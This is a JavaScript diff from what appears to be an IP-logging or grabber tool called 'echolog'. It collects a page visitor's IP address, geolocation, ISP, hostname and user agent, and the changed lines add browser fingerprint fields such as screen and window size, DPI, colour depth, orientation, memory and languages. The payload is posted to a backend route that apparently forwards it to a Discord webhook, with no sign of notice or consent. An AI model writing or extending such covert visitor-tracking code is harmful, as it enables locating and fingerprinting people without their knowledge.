@@ -102,10 +102,10 @@
 
           // Set up the payload for the webhook
           const payload = {
-            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nLanguages: ${echolog.systemLanguages}\n`,
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Size: ${echolog.windowWidth}x${echolog.windowHeight} (Ratio ${echolog.windowRatio})\nScreen Size: ${echolog.screenWidth}x${echolog.screenHeight} (Ratio ${echolog.screenRatio})\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation} (${echolog.orientationAngle})\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguage: ${echolog.languages}`,
           };
 
-          // Send to your Vercel backend, NOT Discord directly!
+          // Instead of sending to Discord directly, send to your Vercel backend
           fetch("/api/discord-webhook", {
             method: "POST",
             headers: {
